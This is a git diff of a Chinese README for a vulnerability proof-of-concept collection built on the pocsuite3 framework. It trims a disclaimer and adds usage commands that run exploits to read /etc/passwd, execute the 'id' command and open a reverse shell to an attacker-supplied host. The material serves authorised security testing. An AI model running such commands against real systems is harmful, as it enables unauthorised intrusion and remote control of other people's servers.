@@ -12,10 +12,6 @@ Github地址 : https://github.com/knownsec/pocsuite3
 
 ## 使用需知
 
-由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者不为此承担任何责任。
-
-PeiQi文库 拥有对此文章的修改和解释权如欲转载或传播此文章，必须保证此文章的完整性，包括版权声明等全部内容。未经作者允许，不得任意修改或者增减此文章内容，不得以任何方式将其用于商业目的。
-
 POC/EXP 仅仅只供对已授权的目标使用测试，对未授权目标的测试PeiQi文库不承担责任，均由本人自行承担
 
 本文库中的漏洞均为公开的漏洞收集，如果文库中的漏洞出现敏感内容产生了部分影响，请及时联系作者删除漏洞，望谅解~
@@ -26,15 +22,27 @@ POC/EXP 仅仅只供对已授权的目标使用测试，对未授权目标的测
 
 ## 关于使用
 
-POC/EXP 的使用依赖于Posuite3，使用前请认真阅读该框架使用方法
+```
+文件读取验证
+python3 cli.py -u "http://xxx.xxx.xxx.xxx" -r pocs/poc.py --attack --filename "/etc/passwd"
+```
+![](image/image-3.png)
 
-大部分POC/EXP都会包含 attack模式和shell模式, 来最大化的减少安全人员的利用和验证时间
+```
+命令执行验证
+python3 cli.py -u "http://xxx.xxx.xxx.xxx" -r pocs/poc.py --attack --command "id"
+```
+![](image/image-4.png)
 
-
+```
+反弹Shell验证   
+python3 cli.py -u "http://xxx.xxx.xxx.xxx" -r pocs/poc.py --shell --lhost "xxx.xxx.xxx.xxx"
+```
+![](image/image-5.png)
 
 ## 最后
 
 > 别忘了Github下载完给个小星星⭐
 
-[![Stargazers over time](https://starchart.cc/PeiQi0/PeiQi-WIKI-POC.svg)](https://starchart.cc/PeiQi0/PeiQi-WIKI-POC)
+[![Stargazers over time](https://github.com/PeiQi0/PeiQi-WIKI-PocSuite3.svg)](https://github.com/PeiQi0/PeiQi-WIKI-PocSuite3)
 
